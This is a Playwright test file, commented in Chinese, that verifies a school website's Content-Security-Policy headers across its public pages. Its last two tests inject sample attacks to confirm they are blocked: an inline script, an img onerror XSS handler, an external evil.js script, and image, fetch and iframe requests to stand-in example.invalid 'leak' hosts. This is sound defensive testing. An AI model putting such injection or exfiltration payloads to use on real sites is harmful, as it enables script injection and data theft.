import { expect, test, type Page } from '@playwright/test'
import { SLOTS_CAMPUS } from './stack-env'

// 公開頁 CSP 的 script-src（2026-11-04 資安強化，web/server/utils/script-csp.ts）：
// production build 的每一頁都要帶 script-src，而且頁面自己的 inline script（Nuxt 設定、importmap、
// useHead 放的幾支）與用戶端換頁時 head 管理器插入的 script 都不能被擋；注入的腳本則要被擋。
// nuxt dev（E2E_WEB_MODE=dev）刻意不收 script-src，整檔略過。

test.skip(process.env.E2E_WEB_MODE === 'dev', 'nuxt dev 不收 script-src')

const PAGES = ['/', '/about', '/curriculum', '/environment', '/admission', '/news', '/visit', `/visit/${SLOTS_CAMPUS}`, '/visit/manage', '/anniversary', '/preview']

async function watchViolations(page: Page): Promise<() => Promise<string[]>> {
  await page.addInitScript(() => {
    const store = (window as unknown as { __cspViolations: string[] })
    store.__cspViolations = []
    document.addEventListener('securitypolicyviolation', (event) => {
      store.__cspViolations.push(`${event.violatedDirective} ${event.blockedURI} ${event.sample}`.trim())
    }, true)
  })
  return () => page.evaluate(() => (window as unknown as { __cspViolations: string[] }).__cspViolations)
}

for (const path of PAGES) {
  test(`${path} 帶 script-src、頁面自己的 inline script 沒有被擋`, async ({ page }) => {
    const violations = await watchViolations(page)
    const response = await page.goto(path, { waitUntil: 'networkidle' })
    const csp = response?.headers()['content-security-policy'] ?? ''
    expect(csp).toMatch(/^script-src 'self' /)
    expect(csp).toContain("script-src-attr 'none'")
    expect(csp).not.toContain('unsafe-inline')
    await expect(page.locator('#__nuxt')).not.toBeEmpty()
    expect(await page.evaluate(() => document.documentElement.dataset.ivyMotion)).toBe('ready')
    expect(await violations()).toEqual([])
  })
}

test('用戶端換頁時 head 管理器插入的 inline script 不會被擋（30 週年閘門、首頁布幕）', async ({ page }) => {
  const violations = await watchViolations(page)
  await page.goto('/about', { waitUntil: 'networkidle' })
  for (const target of ['/anniversary', '/', '/visit']) {
    await page.evaluate((href) => {
      const app = (document.querySelector('#__nuxt') as unknown as { __vue_app__: { config: { globalProperties: { $router: { push(to: string): Promise<unknown> } } } } }).__vue_app__
      return app.config.globalProperties.$router.push(href)
    }, target)
    await expect(page).toHaveURL(new RegExp(`${target === '/' ? '/$' : target}`))
    await page.waitForLoadState('networkidle')
  }
  expect(await violations()).toEqual([])
})

test('注入的 inline script、事件屬性與外站腳本都會被擋（反向對照）', async ({ page }) => {
  const violations = await watchViolations(page)
  await page.goto('/news', { waitUntil: 'networkidle' })
  const ran = await page.evaluate(async () => {
    const flags = window as unknown as Record<string, unknown>
    const inline = document.createElement('script')
    inline.textContent = 'window.__injectedInline = true'
    document.head.appendChild(inline)
    const holder = document.createElement('div')
    holder.innerHTML = '<img src="data:," onerror="window.__injectedHandler = true">'
    document.body.appendChild(holder)
    const external = document.createElement('script')
    external.src = 'https://example.invalid/evil.js'
    document.head.appendChild(external)
    await new Promise((resolve) => setTimeout(resolve, 500))
    return { inline: Boolean(flags.__injectedInline), handler: Boolean(flags.__injectedHandler) }
  })
  expect(ran).toEqual({ inline: false, handler: false })
  const seen = await violations()
  expect(seen.some((line) => line.startsWith('script-src-elem inline'))).toBe(true)
  expect(seen.some((line) => line.startsWith('script-src-attr inline'))).toBe(true)
  // CSP 在發出請求前就擋下（.invalid 也不會真的去解析）；blockedURI 可能只留 origin。
  expect(seen.some((line) => line.includes('https://example.invalid'))).toBe(true)
})

test('注入的外站圖片、fetch、iframe 都會被擋，資料帶不出去（2026-11-12 img-src／connect-src／frame-src）', async ({ page }) => {
  const violations = await watchViolations(page)
  const response = await page.goto('/visit', { waitUntil: 'networkidle' })
  const csp = response?.headers()['content-security-policy'] ?? ''
  expect(csp).toContain("img-src 'self' data: blob: https://i.ytimg.com")
  expect(csp).toContain("connect-src 'self' https://challenges.cloudflare.com")
  expect(csp).toContain("frame-src 'self' https://www.youtube-nocookie.com https://challenges.cloudflare.com")
  const fetched = await page.evaluate(async () => {
    const img = document.createElement('img')
    img.src = 'https://img.example.invalid/leak.png?d=1'
    document.body.appendChild(img)
    const frame = document.createElement('iframe')
    frame.src = 'https://frame.example.invalid/'
    document.body.appendChild(frame)
    let fetchedOk = true
    try { await fetch('https://connect.example.invalid/leak') } catch { fetchedOk = false }
    await new Promise((resolve) => setTimeout(resolve, 500))
    return fetchedOk
  })
  expect(fetched).toBe(false)
  const seen = await violations()
  expect(seen.some((line) => line.startsWith('img-src') && line.includes('img.example.invalid'))).toBe(true)
  expect(seen.some((line) => line.startsWith('frame-src') && line.includes('frame.example.invalid'))).toBe(true)
  expect(seen.some((line) => line.startsWith('connect-src') && line.includes('connect.example.invalid'))).toBe(true)
})
